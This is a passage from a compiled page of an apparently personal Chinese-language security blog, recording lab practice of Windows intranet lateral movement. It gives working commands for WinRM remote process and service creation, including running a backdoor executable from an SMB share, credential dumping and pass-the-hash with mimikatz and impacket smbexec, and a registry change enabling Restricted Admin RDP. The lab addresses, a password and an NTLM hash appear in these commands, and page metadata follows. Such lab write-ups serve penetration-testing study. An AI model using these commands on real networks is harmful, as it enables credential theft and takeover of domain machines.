style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>shell winrm invoke Create wmicimv2/win32_process @{CommandLine=&quot;calc.exe&quot;} -r:192.168.30.10 -u:Administrator -p:uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在目标机器上启动一个计算器进程</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-calc.png" alt="winrm-calc" tabindex="0" loading="lazy"><figcaption>winrm-calc</figcaption></figure><p>也可以通过生成服务的方式</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#生成名为test的服务</span></span>
<span class="line"><span>winrm invoke Create wmicimv2/Win32_Service @{Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\\windows\\system32\\calc.exe&quot;} -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/test-service.png" alt="test-service" tabindex="0" loading="lazy"><figcaption>test-service</figcaption></figure><p>执行以下命令，远程调用该服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/open-tes-service.png" alt="open-tes-service" tabindex="0" loading="lazy"><figcaption>open-tes-service</figcaption></figure><p>执行SMB匿名服务器中的后门文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>shell winrm invoke Create wmicimv2/Win32_Service @{Name=&quot;test2&quot;;DisplayName=&quot;test2&quot;;PathName=&quot;cmd.exe /k \\\\192.168.30.20\\smb\\Winrm.exe&quot;} -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-dc-smb.png" alt="winrm-dc-smb" tabindex="0" loading="lazy"><figcaption>winrm-dc-smb</figcaption></figure><h3 id="获取交互式会话" tabindex="-1"><a class="header-anchor" href="#获取交互式会话"><span>获取交互式会话</span></a></h3><ul><li>利用powershell</li></ul><p>powershell基于WinRM规范，Enter-PSSession的Powershell Cmdlet可以启动与远程主机的会话</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#指定远程系统名</span></span>
<span class="line"><span>$User = &quot;hack\\Administrator&quot;</span></span>
<span class="line"><span>#指定用户密码</span></span>
<span class="line"><span>$Password = ConvertTo-SecureString -String &quot;uu2fu3o@admin&quot; -AsPlainText -Force</span></span>
<span class="line"><span>#整合用户名和密码</span></span>
<span class="line"><span>$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span></span>
<span class="line"><span>#根据提供的凭据创建会话</span></span>
<span class="line"><span>New-PSSession -Name WinRM1 -ComputerName 192.168.30.10 -Credential $Cred -Port 5985</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行Get-PSSession来查看已经获取的shell</p><h3 id="evil-winrm" tabindex="-1"><a class="header-anchor" href="#evil-winrm"><span>Evil-Winrm</span></a></h3><p>项目地址：<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">https://github.com/Hackplayers/evil-winrm</a></p><p>需要ruby环境</p><h2 id="哈希传递-pth-攻击" tabindex="-1"><a class="header-anchor" href="#哈希传递-pth-攻击"><span>哈希传递(PTH)攻击</span></a></h2><p>哈希传递是一种针对NTLM协议的攻击技术，在NTLM身份认证的第三步生成Response时，直接使用hash值进行计算，代替使用明文密码.(简单提一嘴，kerberos使用ticket进行验证)</p><h3 id="为什么要使用pth" tabindex="-1"><a class="header-anchor" href="#为什么要使用pth"><span>为什么要使用pth</span></a></h3><ul><li>目标主机在win server 2012之后，lsass.exe进程中是抓不到明文密码的</li><li>hash并不好破解</li></ul><h3 id="简单了解hash" tabindex="-1"><a class="header-anchor" href="#简单了解hash"><span>简单了解hash</span></a></h3><p>Windows操作系统经常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中，加密后为散列值。</p><p>Windows操作系统中的密码一般由两部分组成，一部分为LMHash，另一部分为NTLM Hash。在windows中，Hash的结构通常如下</p><p>username:RID:LM-HASH:NT-HASH</p><h3 id="pth的利用" tabindex="-1"><a class="header-anchor" href="#pth的利用"><span>PTH的利用</span></a></h3><ul><li>利用mimikatz进行pth</li></ul><p>上传mimikatz至跳板机目录下，执行以下命令抓取hash</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/DC-ntlm-hash.png" alt="DC-ntlm-hash" tabindex="0" loading="lazy"><figcaption>DC-ntlm-hash</figcaption></figure><p>利用mimikatz,使用抓取到的NTLM哈希进行PTH攻击</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:c17336b6c2ea715e02e8bbd04c91e543&quot; exit</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/mimikatz-file-dir.png" alt="mimikatz-file-dir" tabindex="0" loading="lazy"><figcaption>mimikatz-file-dir</figcaption></figure><p>攻击后会开启一个cmd命令行，能够在该命令行中访问DC主机的CIFS服务</p><ul><li>利用impacket进行PTH</li></ul><p>impacket提供的几个横向脚本基本都可以使用hash进行传递，<a href="http://xn--smbexec-ff6kt45e.py" target="_blank" rel="noopener noreferrer">例如smbexec.py</a>,<a href="http://psexec.py" target="_blank" rel="noopener noreferrer">psexec.py</a>,<a href="http://wmiexec.py" target="_blank" rel="noopener noreferrer">wmiexec.py</a>,以smbexec.py为例，执行脚本传递hash获取一个交互式的shell</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">python smbexec.py </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">hashes  :c17336b6c2ea715e02e8bbd04c91e543 hack.com</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Administrator</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.30.10</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#python smbexec.py -hashes LM HASH:NTLM HASH &lt;domain&gt;/&lt;username&gt;@&lt;IP&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/impacket-PTH.png" alt="impacket-PTH" tabindex="0" loading="lazy"><figcaption>impacket-PTH</figcaption></figure><h3 id="利用pth登录远程桌面" tabindex="-1"><a class="header-anchor" href="#利用pth登录远程桌面"><span>利用PTH登录远程桌面</span></a></h3><h4 id="利用条件-3" tabindex="-1"><a class="header-anchor" href="#利用条件-3"><span>利用条件</span></a></h4><ul><li>远程主机开启了“受限管理员”模式</li><li>用于登陆的用户位于远程主机的管理员组中</li><li>拥有目标用户的hash</li></ul><p>win server2012 R2以上的版本采用新版RDP，在受限管理员模式下，可以直接使用hash登录远程桌面，不需要提供明文密码</p><p>执行以下命令开启受限管理员模式</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg add &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/open-DisableRestrictedAdmin.png" alt="open-DisableRestrictedAdmin" tabindex="0" loading="lazy"><figcaption>open-DisableRestrictedAdmin</figcaption></figure><p>执行以下命令，查看机器是否开启了受限管理员模式</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>reg query &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如果为0则是开启状态，为1则关闭</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/look-DisableRA.png" alt="look-DisableRA" tabindex="0" loading="lazy"><figcaption>look-DisableRA</figcaption></figure><p>当远程主机开启了受限管理员模式，使用mimikatz进行哈希传递攻击</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>privilege::debug sekurlsa::pth /user:Administrator /domain:hack.com /ntlm:c17336b6c2ea715e02e8bbd04c91e543 &quot;/run:mstsc.exe /restrictedadmin&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>哈希传递成功后执行<code>/run:mstsc.exe /restrictedadmin</code>命令，此种情况不需要密码即可登录，需要注意的是用户哈希需要是远程主机</p><p>管理组中的用户</p><p>然而我搭建的环境中的远程桌面没有该参数，懒得拉环境再测试了，本地机器是有的</p><h2 id="有关横向的漏洞" tabindex="-1"><a class="header-anchor" href="#有关横向的漏洞"><span>有关横向的漏洞</span></a></h2><p>内网环境中，可以利用这些漏洞来进行横向，例如永恒之蓝，MS08-67,CVE-2019-0708</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/ms17.png" alt="ms17" tabindex="0" loading="lazy"><figcaption>ms17</figcaption></figure><h2 id="总结一下" tabindex="-1"><a class="header-anchor" href="#总结一下"><span>总结一下</span></a></h2><p>横向移动的方法还没有全部实现，像PTT的方法，我打算放到权限持久化或者是票据专题中来练习，所以，这篇文章是基础的，枯燥的，残缺的，下面总结的几个问题也有从往上剽窃来的回答，也有我自己的思考，有错误还希望师傅们指出。</p><ul><li>横向移动有哪些手法？</li></ul><p>​ CIFS服务(即文件服务的利用),WMI , DCOM/RPC, WinRM , RDP,系统服务,计划任务，Psexec , PTH</p><ul><li>横向移动分为哪几个阶段？/ 需要做哪些准备？</li></ul><p>​ step1:本机信息收集：内网信息收集：收集当前计算机的网络连接、进程列表、命令执行历史记录、数据库信息、当前用户信息、管理员登录信息、总结密码规律、补丁更新频率等信息；内网情报刺探：刺探内网其他计算机或服务器的 IP、主机名、开放端口、开放服务、开放应用等情报。</p><p>​ step2:利用内网计算机或服务器中的不及时修复漏洞、不做安全防护、使用相同口令等弱点来进行横向渗透扩大战果</p><p>​ setp3:横向过程中重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作</p><ul><li>横向移动核心的部分是什么？</li></ul><p>​ 在我看来横向移动核心的部分是能否获取到对应远程主机的用户凭据，大部分横向移动的方法都需要用到用户凭据，并且对凭据权限的要求并不低。我认为第二重要的是能否利用CIFS上传文件，在我搭建理论的实验环境中，大部分获取shell的情况都需要远程主机执行SMB匿名共享中的脚本文件，或者是上传脚本文件到远程主机的可执行目录下，用一句话上线的情况并不多。</p><p>那么衍生出来的问题</p><ul><li><p>什么样的横向移动不需要获取到用户的凭据</p><p>DCOM，通过RPC调用远程方法直接执行命令，但是该方法也有弊端，例如需要先获取方法，并且双方都需要开启DCOM服务，利用impacket脚本获取shell同样需要凭据</p></li><li><p>如何绕过监测，实现横向移动?</p></li></ul><p>​ 我认为这个算是后话了，目前来看大部分横向移动留下的痕迹并不少,例如在PsExec的使用中会生成大量的日志文件(虽然我在实验中并没有检测到异常日志，但真实环境中会对工具特征进行监测)，痕迹多并不意味着这个工具就不好用，PsExec基于SMB服务，我不认为在正常内网环境中，会主动去关闭该项服务。我认为理解什么方法利用什么服务，利用哪些协议，明白web对抗点才是绕过的关键</p><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接"><span>参考链接</span></a></h2><p><a href="https://tttang.com/archive/1890/#toc_wmi" target="_blank" rel="noopener noreferrer">https://tttang.com/archive/1890/#toc_wmi</a></p><p><a href="https://www.freebuf.com/articles/system/229200.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/system/229200.html</a></p><p><a href="https://ciphersaw.me/2019/09/22/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/" target="_blank" rel="noopener noreferrer">https://ciphersaw.me/2019/09/22/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/</a></p><p><a href="https://xz.aliyun.com/t/9691" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/9691</a></p><p>《内网渗透体系建设》一书</p><p>各种工具的项目地址已在文中，就不复制粘贴一遍了。</p>`,399)]))}const o=e(n,[["render",l],["__file","内网横向移动.html.vue"]]),d=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html","title":"内网横向移动","lang":"zh-CN","frontmatter":{"title":"内网横向移动","date":"2023-09-03T07:29:52.000Z","updated":"2023-09-13T10:06:41.000Z","categories":["渗透测试","内网体系建设"],"description":"内网横向 环境搭建 攻击机kali:192.168.14.131 域内机器PC方便测试我添加了两张网卡，一张同通向kali，一张通向域内机器DC，用蚁剑管理，方便横向测试 域控主机DC:192.168.30.10 横向移动中的文件传输 利用IPC$进行网络共享 https://xz.aliyun.com/t/11783 IPC$(Internet Pr...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"内网横向移动"}],["meta",{"property":"og:description","content":"内网横向 环境搭建 攻击机kali:192.168.14.131 域内机器PC方便测试我添加了两张网卡，一张同通向kali，一张通向域内机器DC，用蚁剑管理，方便横向测试 域控主机DC:192.168.30.10 横向移动中的文件传输 利用IPC$进行网络共享 https://xz.aliyun.com/t/11783 IPC$(Internet Pr..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGolinux-smbserver.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:published_time","content":"2023-09-03T07:29:52.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"内网横向移动\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGolinux-smbserver.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-smbserver.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-dc-tp-pc-smbserver.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/certutil-pc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/bitsadmin-pc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powershell-download-pc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-mission.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-plan-mission.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-missions-delete.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-pan.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-plan-2-shell.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/ipc-built-pc_to_dc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-paild-menu.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-cs-shell.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SCshell-smb-share.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/systeminfo-faild.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/scshell-powershell-cs.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SID-RID-PC.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-close.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-open.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-wmi-dc-rdp-open.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-query-user.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-sharprdp-cacl.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-cacl-sharprdp.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-smb-target.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-pcapng.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/how_to_use_psexec.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-to-dc-psexec-systeminfo.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/dc-log-psexec.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-dc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-to-dc-systeminfo.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msf-wmic-listening.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/c-share.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msi-pc-dc-wmic.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/wmiexec-pc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powerspolit-dc-to-ps.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-dc-local.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-local-dcom-find.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-dcom-mmc-local.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-local-test-dc-calc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/Dcom-upload.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/remote-dc-dcom.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/shellwindows-id.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-shellwindows.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowserwindow.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowsewindow-method.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowerwindows-exe.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcomexec-py.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/win2012-running.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-winrm-config.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-whoami.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-get-dc-shell.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-calc.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/test-service.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/open-tes-service.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/winrm-dc-smb.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/DC-ntlm-hash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/mimikatz-file-dir.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/impacket-PTH.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/open-DisableRestrictedAdmin.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/look-DisableRA.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/ms17.png\\"],\\"datePublished\\":\\"2023-09-03T07:29:52.000Z\\",\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"横向移动中的文件传输","slug":"横向移动中的文件传输","link":"#横向移动中的文件传输","children":[{"level":3,"title":"利用IPC$进行网络共享","slug":"利用ipc-进行网络共享","link":"#利用ipc-进行网络共享","children":[]},{"level":3,"title":"搭建SMB服务器","slug":"搭建smb服务器","link":"#搭建smb服务器","children":[]},{"level":3,"title":"利用windows自带的工具","slug":"利用windows自带的工具","link":"#利用windows自带的工具","children":[]}]},{"level":2,"title":"计划任务横向","slug":"计划任务横向","link":"#计划任务横向","children":[{"level":3,"title":"常规流程","slug":"常规流程","link":"#常规流程","children":[]},{"level":3,"title":"UNC路径加载执行","slug":"unc路径加载执行","link":"#unc路径加载执行","children":[]}]},{"level":2,"title":"利用系统服务","slug":"利用系统服务","link":"#利用系统服务","children":[{"level":3,"title":"创建远程服务，利用SC进行横向","slug":"创建远程服务-利用sc进行横向","link":"#创建远程服务-利用sc进行横向","children":[]},{"level":3,"title":"无文件横向移动SCshell","slug":"无文件横向移动scshell","link":"#无文件横向移动scshell","children":[]},{"level":3,"title":"UAC Remote Restrictions","slug":"uac-remote-restrictions","link":"#uac-remote-restrictions","children":[]}]},{"level":2,"title":"远程桌面利用","slug":"远程桌面利用","link":"#远程桌面利用","children":[{"level":3,"title":"远程桌面的确定和开启","slug":"远程桌面的确定和开启","link":"#远程桌面的确定和开启","children":[]},{"level":3,"title":"RDP Hijacking","slug":"rdp-hijacking","link":"#rdp-hijacking","children":[]},{"level":3,"title":"SharpRDP","slug":"sharprdp","link":"#sharprdp","children":[]}]},{"level":2,"title":"PsExec远控","slug":"psexec远控","link":"#psexec远控","children":[]},{"level":2,"title":"利用WMI进行横向移动","slug":"利用wmi进行横向移动","link":"#利用wmi进行横向移动","children":[{"level":3,"title":"What is WMI","slug":"what-is-wmi","link":"#what-is-wmi","children":[]},{"level":3,"title":"常规利用方法","slug":"常规利用方法","link":"#常规利用方法","children":[]},{"level":3,"title":"常见利用工具","slug":"常见利用工具","link":"#常见利用工具","children":[]},{"level":3,"title":"WMI订阅事件的利用","slug":"wmi订阅事件的利用","link":"#wmi订阅事件的利用","children":[]}]},{"level":2,"title":"利用DCOM","slug":"利用dcom","link":"#利用dcom","children":[{"level":3,"title":"本地DCOM测试","slug":"本地dcom测试","link":"#本地dcom测试","children":[]},{"level":3,"title":"远程DCOM执行命令","slug":"远程dcom执行命令","link":"#远程dcom执行命令","children":[]}]},{"level":2,"title":"WinRM","slug":"winrm","link":"#winrm","children":[{"level":3,"title":"利用条件","slug":"利用条件-2","link":"#利用条件-2","children":[]},{"level":3,"title":"通过WinRM执行远程命令","slug":"通过winrm执行远程命令","link":"#通过winrm执行远程命令","children":[]},{"level":3,"title":"获取交互式会话","slug":"获取交互式会话","link":"#获取交互式会话","children":[]},{"level":3,"title":"Evil-Winrm","slug":"evil-winrm","link":"#evil-winrm","children":[]}]},{"level":2,"title":"哈希传递(PTH)攻击","slug":"哈希传递-pth-攻击","link":"#哈希传递-pth-攻击","children":[{"level":3,"title":"为什么要使用pth","slug":"为什么要使用pth","link":"#为什么要使用pth","children":[]},{"level":3,"title":"简单了解hash","slug":"简单了解hash","link":"#简单了解hash","children":[]},{"level":3,"title":"PTH的利用","slug":"pth的利用","link":"#pth的利用","children":[]},{"level":3,"title":"利用PTH登录远程桌面","slug":"利用pth登录远程桌面","link":"#利用pth登录远程桌面","children":[]}]},{"level":2,"title":"有关横向的漏洞","slug":"有关横向的漏洞","link":"#有关横向的漏洞","children":[]